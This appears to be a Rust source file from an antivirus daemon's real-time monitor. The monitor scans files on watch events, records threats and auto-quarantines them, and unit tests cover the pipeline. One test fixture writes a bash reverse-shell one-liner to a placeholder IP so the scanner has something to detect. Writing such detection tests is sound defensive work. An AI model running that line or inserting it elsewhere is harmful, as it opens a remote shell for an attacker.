//! The real-time pipeline: consume [`WatchEvent`]s, scan the file, and react.
//!
//! This is deliberately decoupled from the event *source* (inotify/fanotify) so
//! the whole detect-and-respond path can be unit-tested by feeding synthetic
//! events through a channel — no kernel privileges required.

use crate::state::DaemonState;
use aegis_core::now_epoch;
use aegis_quarantine::Quarantine;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use tokio::sync::mpsc;

use super::WatchEvent;

/// Drives the scan/response pipeline for real-time events.
pub struct Monitor {
    state: Arc<DaemonState>,
    auto_quarantine: bool,
}

impl Monitor {
    pub fn new(state: Arc<DaemonState>, auto_quarantine: bool) -> Self {
        Self {
            state,
            auto_quarantine,
        }
    }

    /// Consume events until the channel closes. Each event is scanned on a
    /// blocking thread pool so a slow scan never stalls the async runtime.
    pub async fn run(self, mut rx: mpsc::Receiver<WatchEvent>) {
        tracing::info!("real-time monitor started");
        while let Some(event) = rx.recv().await {
            self.state.rt_events.fetch_add(1, Ordering::Relaxed);
            self.handle(event).await;
        }
        tracing::info!("real-time monitor stopped");
    }

    async fn handle(&self, event: WatchEvent) {
        let state = self.state.clone();
        let path = event.path.clone();
        // Run the (CPU/IO-bound) scan off the async reactor.
        let verdict = tokio::task::spawn_blocking(move || {
            let scanner = state.scanner();
            scanner.scan_file(&path)
        })
        .await;

        let verdict = match verdict {
            Ok(v) => v,
            Err(e) => {
                tracing::error!(error = %e, "real-time scan task panicked");
                return;
            }
        };

        if !verdict.is_threat() {
            return;
        }

        let top = verdict.top_detection().cloned();
        let names = verdict.threat_names();
        tracing::warn!(
            path = %verdict.path.display(),
            threat = %names,
            "real-time threat detected"
        );

        // Persist to history under the "realtime" kind.
        let repo = self.state.db.scans();
        if let Ok(scan_id) = repo.insert_scan(
            now_epoch(),
            now_epoch(),
            &verdict.path.to_string_lossy(),
            1,
            1,
            "realtime",
        ) {
            for d in &verdict.detections {
                let _ = repo.insert_threat(
                    scan_id,
                    now_epoch(),
                    &verdict.path.to_string_lossy(),
                    &verdict.sha256,
                    &d.threat,
                    &d.engine,
                    d.severity as i64,
                    if self.auto_quarantine {
                        "quarantined"
                    } else {
                        "detected"
                    },
                );
            }
        }
        self.state.threats_found.fetch_add(1, Ordering::Relaxed);

        // Optionally neutralize immediately.
        if self.auto_quarantine {
            if let Some(top) = top {
                match Quarantine::open(&self.state.db) {
                    Ok(q) => {
                        match q.quarantine(
                            &verdict.path,
                            &verdict.sha256,
                            &top.threat,
                            &top.engine,
                            verdict.severity() as i64,
                            now_epoch(),
                        ) {
                            Ok(_) => {
                                self.state.rt_blocked.fetch_add(1, Ordering::Relaxed);
                                tracing::warn!(
                                    path = %verdict.path.display(),
                                    "real-time threat quarantined"
                                );
                            }
                            Err(e) => tracing::error!(error = %e, "auto-quarantine failed"),
                        }
                    }
                    Err(e) => tracing::error!(error = %e, "cannot open quarantine vault"),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::realtime::EventKind;
    use aegis_core::{Config, Whitelist};
    use aegis_storage::Database;

    #[tokio::test]
    async fn realtime_pipeline_detects_and_quarantines() {
        let tmp = tempfile::tempdir().unwrap();
        // Write a malicious script into the watched area.
        let victim = tmp.path().join("evil.sh");
        std::fs::write(
            &victim,
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let db = Arc::new(Database::open_in_memory().unwrap());
        let state = DaemonState::new(Config::default(), Whitelist::default(), db);

        // Feed one synthetic event through the pipeline with auto-quarantine on.
        let (tx, rx) = mpsc::channel(4);
        let monitor = Monitor::new(state.clone(), true);
        let handle = tokio::spawn(monitor.run(rx));

        tx.send(WatchEvent {
            path: victim.clone(),
            kind: EventKind::Written,
        })
        .await
        .unwrap();
        drop(tx); // close channel so run() returns
        handle.await.unwrap();

        // Threat recorded and file neutralized (moved to the vault).
        assert_eq!(state.threats_found.load(Ordering::Relaxed), 1);
        assert_eq!(state.rt_blocked.load(Ordering::Relaxed), 1);
        assert!(
            !victim.exists(),
            "auto-quarantine should remove the original"
        );
        assert_eq!(state.db.quarantine().all().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn realtime_ignores_clean_files() {
        let tmp = tempfile::tempdir().unwrap();
        let ok = tmp.path().join("notes.txt");
        std::fs::write(&ok, b"perfectly ordinary text").unwrap();

        let db = Arc::new(Database::open_in_memory().unwrap());
        let state = DaemonState::new(Config::default(), Whitelist::default(), db);

        let (tx, rx) = mpsc::channel(4);
        let monitor = Monitor::new(state.clone(), true);
        let handle = tokio::spawn(monitor.run(rx));
        tx.send(WatchEvent {
            path: ok,
            kind: EventKind::Written,
        })
        .await
        .unwrap();
        drop(tx);
        handle.await.unwrap();

        assert_eq!(state.threats_found.load(Ordering::Relaxed), 0);
    }
}
